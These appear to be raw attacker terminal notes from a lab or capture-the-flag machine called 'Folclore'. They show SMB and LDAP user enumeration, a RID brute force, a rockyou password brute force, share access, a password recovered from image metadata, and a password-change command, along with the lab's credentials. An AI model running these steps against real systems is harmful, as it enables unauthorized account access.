ldapsearch -h 192.168.69.9 -x -b "DC=FOLCLORE" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "


enum4linux -U  192.168.69.9  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"







┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "guest" -p ""   --rid-brute
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\guest: (Guest)
SMB         192.168.69.9    445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
SMB         192.168.69.9    445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
                                                                                                  







Administrador
Invitado
Quetzalcoatl
El_charro_negro
Ix_Chel
Tlaloc
La_mulata_de_Cordoba
La_Catrina




┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep "STATUS_PASSWORD_EXPIRED"
SMB                      192.168.69.9    445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED 






┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep "STATUS_PASSWORD_EXPIRED"
SMB                      192.168.69.9    445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED 
^C^C
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep "+"                      
^C
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding           
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED 








➜  Folclore netexec smb 192.168.69.9 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true







┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u El_charro_negro -p 'cuenca12345' --shares  
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\El_charro_negro:cuenca12345 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro             READ,WRITE      ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo



┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient  //192.168.69.9/Oro -U El_charro_negro                 
Password for [WORKGROUP\El_charro_negro]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 29 17:56:39 2025
  ..                                  D        0  Mon Sep 29 17:56:39 2025
  El_Charro_Negro.jpeg                A    50061  Mon Jul 28 20:40:26 2025

                15581256 blocks of size 4096. 10762905 blocks available
smb: \> get El_Charro_Negro.jpeg 
getting file \El_Charro_Negro.jpeg of size 50061 as El_Charro_Negro.jpeg (118.7 KiloBytes/sec) (average 118.7 KiloBytes/sec)
smb: \> 




 impacket-changepasswd 'Folclore/Ix_Chel':'4+9Ii1wK'@192.168.69.9











──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient  //192.168.69.9/Oro -U El_charro_negro                 
Password for [WORKGROUP\El_charro_negro]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 29 17:56:39 2025
  ..                                  D        0  Mon Sep 29 17:56:39 2025
  El_Charro_Negro.jpeg                A    50061  Mon Jul 28 20:40:26 2025

                15581256 blocks of size 4096. 10762905 blocks available
smb: \> get El_Charro_Negro.jpeg 
getting file \El_Charro_Negro.jpeg of size 50061 as El_Charro_Negro.jpeg (118.7 KiloBytes/sec) (average 118.7 KiloBytes/sec)
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now

                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ exiftool El_Charro_Negro.jpeg                        
ExifTool Version Number         : 13.25
File Name                       : El_Charro_Negro.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2025:09:29 17:57:27-04:00
File Access Date/Time           : 2025:09:29 17:57:28-04:00
File Inode Change Date/Time     : 2025:09:29 17:57:27-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Y Cb Cr Positioning             : Centered
Copyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK
Image Width                     : 736
Image Height                    : 981
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x981
Megapixels                      : 0.722
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ 
